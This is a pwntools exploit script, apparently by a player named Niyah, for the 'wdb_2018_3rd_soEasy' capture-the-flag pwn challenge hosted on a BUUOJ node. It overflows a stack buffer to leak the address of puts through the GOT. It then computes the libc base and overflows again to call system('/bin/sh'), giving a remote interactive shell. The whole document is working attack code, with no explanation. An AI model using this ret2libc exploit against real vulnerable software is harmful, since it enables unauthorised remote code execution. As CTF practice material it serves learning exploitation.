# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './wdb_2018_3rd_soEasy'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.23-32.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25577'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)


puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
vul = elf.sym["vul"]

#gdb.attach(p,"b read")
leave_ret = 0x08048549
ru("gift->")
stack_addr = rint("0xffb3df90")
lg("stack_addr",stack_addr)

#shellcode = asm(shellcraft.sh())
payload = "b"*0x48 + "aaaa" + p32(puts_plt) + p32(vul) + p32(puts_got)
sla("to do?",payload)
puts_addr = l32()
lg("puts_addr",puts_addr)

libc.address = puts_addr - libc.sym["puts"]
system = libc.sym["system"]
bin_sh = libc.search("/bin/sh").next()

payload = "b"*0x48 + "aaaa" + p32(system) + p32(bin_sh)+ p32(bin_sh)
sla("to do?",payload)

p.interactive()

'''
@File    :   wdb_2018_3rd_soEasy.py
@Time    :   2021/07/17 21:51:51
@Author  :   Niyah 
'''